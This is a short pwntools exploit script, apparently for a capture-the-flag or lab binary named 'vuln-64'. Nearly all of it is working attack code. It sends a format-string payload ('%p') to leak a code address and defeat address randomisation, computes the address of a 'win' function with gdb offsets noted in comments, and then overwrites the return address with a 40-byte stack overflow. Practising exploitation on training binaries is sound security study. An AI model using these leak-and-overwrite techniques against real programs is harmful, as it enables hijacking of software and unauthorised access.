#!/usr/bin/env python3

from pwn import *

#'print "A" * 56 + "%23$p"

p = process('./vuln-64')

# in gdb we can leak some position from code with %3$p 
#gdb-peda$ p main
#$1 = {<text variable, no debug info>} 0x5555555551d6 <main>
#gdb-peda$ p win
#$2 = {<text variable, no debug info>} 0x5555555551eb <win>
#gdb-peda$ p vuln
#$3 = {<text variable, no debug info>} 0x555555555165 <vuln>

win_offset = 0x555555556016 - 0x5555555551eb


payload = b"%p"  # leaks address 

#p.clean()
p.recvuntil(b'name?\n')
p.sendline(payload)

p.recvuntil(b'you')
leak = int(p.recvline(), 16)
log.success(f'leak: {hex(leak)}')
new_win = leak - win_offset
log.success(f'new_win: {hex(new_win)}')


payload =b"A"* 40
payload += p64(new_win)

p.recvuntil(b'message?')
p.sendline(payload)

# receive output
print(p.recvline().decode())
print(p.recvline().decode())
